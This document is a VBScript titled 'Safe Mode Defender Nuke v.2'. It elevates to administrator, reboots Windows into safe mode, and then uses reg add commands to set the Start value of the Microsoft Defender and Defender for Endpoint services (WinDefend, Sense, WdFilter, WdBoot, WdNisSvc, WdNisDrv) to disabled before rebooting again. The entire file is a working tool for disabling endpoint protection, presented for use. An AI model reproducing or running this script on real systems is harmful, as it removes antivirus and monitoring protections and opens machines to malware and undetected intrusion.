' am@CyberOps.Team_ Safe Mode Defender Nuke v.2

' Elevate to admin
If Not WScript.Arguments.Named.Exists("elevate") Then
  CreateObject("Shell.Application").ShellExecute WScript.FullName _
    , """" & WScript.ScriptFullName & """ /elevate", "", "runas", 1
  WScript.Quit
End If

Dim Ans 
Ans = Msgbox ("Are you in Safemode?", vbYesNo, "Defender Safe Mode Nuke - am@CyberOps.Team_")
If Ans = vbYes Then
	'make reg key changes, remove safeboot and reboot
	x=msgbox("Attempting to make registry changes" ,0, "Registry Changes - am@CyberOps.Team_")
	Set oShell = WScript.CreateObject ("WScript.Shell")
	oShell.run "cmd.exe /c reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Sense /v Start /t REG_DWORD /d 4 /f"
	oShell.run "cmd.exe /c reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdBoot /v Start /t REG_DWORD /d 4 /f"
	oShell.run "cmd.exe /c reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdFilter /v Start /t REG_DWORD /d 4 /f"
	oShell.run "cmd.exe /c reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisDrv /v Start /t REG_DWORD /d 4 /f"
	oShell.run "cmd.exe /c reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisSvc /v Start /t REG_DWORD /d 4 /f"
	oShell.run "cmd.exe /c reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend /v Start /t REG_DWORD /d 4 /f"
	x=msgbox("Registry changes set! Exiting Safe mode and rebooting..." ,0, "Registry values changed - am@yberOps.Team_")
	oShell.run "cmd.exe /c bcdedit /deletevalue {current} safeboot"
	oShell.run "cmd.exe /c shutdown -r -t 0"
Else 
	'Enter safemode, reboot
	Set oShell = WScript.CreateObject ("WScript.Shell")
	oShell.run "cmd.exe /c bcdedit /set {current} safeboot minimal"
	x=msgbox("Safemode set. Rerun this script when in safemode and select 'Yes'. Press OK to restart." ,0, "Safemode Set - am@CyberOps.Team_")
	oShell.run "cmd.exe /c shutdown -r -t 0"
End If